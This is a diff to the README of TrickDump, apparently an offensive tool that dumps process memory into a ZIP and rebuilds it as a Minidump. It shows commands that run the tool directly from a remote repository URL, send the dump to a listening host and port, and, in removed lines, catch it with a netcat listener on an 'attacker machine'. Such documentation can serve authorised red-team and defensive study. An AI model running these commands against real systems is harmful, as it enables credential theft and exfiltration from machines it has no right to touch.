@@ -61,26 +61,22 @@ Or run it directly from the repo:
 deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/trick.js
 ```
 
+![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/trickdump/Screenshot_deno_4.png)
+
 You can send the ZIP file to a remote machine instead of writing to disk using the *-i* and *-P* parameters:
 
 ```
-deno run --allow-ffi --allow-net trick.js -i 192.168.1.100 -P 1234
+deno run --allow-ffi --allow-net trick.js -i 127.0.0.1 -P 4444
 ```
 
-Receive it on the attacker machine:
+![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/trickdump/Screenshot_deno_5.png)
 
-```
-nc -lvnp 1234 > trick.zip
-```
 
-You get a ZIP file (trick.zip), and you can create the Minidump file with the *create_dump.py* script using the *-t* flag:
+Either way, you get a ZIP file and you can create the Minidump file with the *create_dump.py* script using the *-t* flag:
 
 ```
 python3 create_dump.py -t trick.zip
 ```
-
-![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/trickdump/Screenshot_deno_4.png)
-
 
 ----------------
 
